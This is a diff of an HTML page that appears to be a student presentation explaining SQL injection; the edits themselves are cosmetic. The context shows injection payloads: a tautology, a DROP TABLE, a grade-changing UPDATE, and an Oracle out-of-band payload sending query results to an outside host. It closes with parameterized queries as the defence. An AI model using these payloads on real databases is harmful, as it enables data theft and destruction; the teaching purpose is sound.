@@ -17,7 +17,7 @@
 	<body>
 		<div class="jumbotron">
 			<center><h1>A Little About SQL Injections</h1>
-				<h3>Jonathan Quang and Daniel Chernovolenko</h3></center>
+				<h3>Lizard_Squad: Jonathan Quang and Daniel Chernovolenko PD 8</h3></center>
 		</div>
 
 		<div id="MainBodyStuff">
@@ -45,8 +45,8 @@ c.execute("CREATE TABLE students (name text, grade real)")
 conn.commit()
 conn.close()</code>
 			</pre>
-			<br>
-			<h2>How Does an Enduser Give Input and Recieve Output</h2>
+			<hr>
+			<h2>How Does an Enduser Give Input and Recieve Output?</h2>
 			<p>The user of a web application like the ones we have done in class gives information in the form of an &ltinput&gt HTML tag. As developers, we store the resulting POST or GET request data in a python variable. For this example, this variable will be <code>userName</code>. In the following codeexample, we print out relevant data to a single user name:
 			</p>
 			<br>
@@ -59,7 +59,7 @@ for row in result:
 			</pre>
 
 
-			<br>
+			<hr>
 			<h2>Security Flaw - SQL Injections</h2>
 			<p> Look at the part where we compose the sql statement: <code>sqlStatement = "SELECT * FROM students WHERE name = " + userName</code>. If a malicious user chooses not to put their username, but rather some logic stuff, such as "105 OR 1=1" into the &ltinput&gt HTML tag, the resulting string, <code>sqlStatement</code> is now equal to <code>"SELECT * FROM students WHERE name = 105 OR 1=1"</code> The executed code now looks like the following:
 			</p>
@@ -74,7 +74,7 @@ for row in result:
 			<br>
 			<p>name=105 or 1=1 is a logical statement that is always true. This results in the entire table of students being printed out.
 			</p>
-			<br>
+			<hr>
 			<h2>SQL Injections, but Even Worse</h2>
 			<p>Recall that ";" can be used to denote the end of an SQL statement. If a semicolon is used in the &ltinput&gt HTML element, then a hacker can put in any SQL statement they wish. Let's say that they put <code>105; DROP TABLE students</code>. The <code>sqlStatement</code> string is now <code>"SELECT * FROM students WHERE  name = 105; DROP TABLE students"</code>. This hacker has now just caused the loss of an entire table.
 			</p>
@@ -82,7 +82,7 @@ for row in result:
 			<p>
 			Hackers can also modify data using UPDATE-SET-WHERE. Lets say they type in <code>105;UPDATE students SET testScore1 = 100 WHERE name="Bob Ross"</code>. Now our hacker, Bob Ross, has given himself a free 100 for the class.
 			</p>
-			<br>
+			<hr>
 			<h2>There are Three Types Of SQL Injections </h2>
 				<h3>In-Band SQLi</h3>
 				<p>
@@ -136,6 +136,7 @@ http://www.example.com/product.php?id=10 AND IF(version() like ‘5%’, sleep(1
 http://www.example.com/product.php?id=10||UTL_HTTP.request(‘testerserver.com:80’||(SELECT user FROM DUAL)--</code>
 									</pre>
 								<p>In this example, the tester is concatenating the value 10 with the result of the function UTL_HTTP.request. This Oracle function will try to connect to ‘testerserver’ and make a HTTP GET request containing the return from the query “SELECT user FROM DUAL”. The tester can set up a webserver (e.g. Apache) to get the result.</p>
+				<hr>
 				<h2>Preventing SQL Injection</h2>
 				<p class="noindent">We want python and the SQL database to treat the end-user’s input literally.<br>
 						Accomplished using “?” in python with sqlite3<br></p>
@@ -147,6 +148,7 @@ c.execute('SELECT * FROM stocks WHERE symbol=?', input)</code>
 						Instead of executing a string, a tuple is executed.<br>
 						Other programming languages and SQL DB systems have other ways of executing a literal.
 						</p>
+					<hr>
 					<h2> Sources for learning more: </h2>
 					<h4> Our demo:</h4>
 						<p><a href="https://github.com/dchernovolenko/presentation2">Github Repo for demo</a></p>
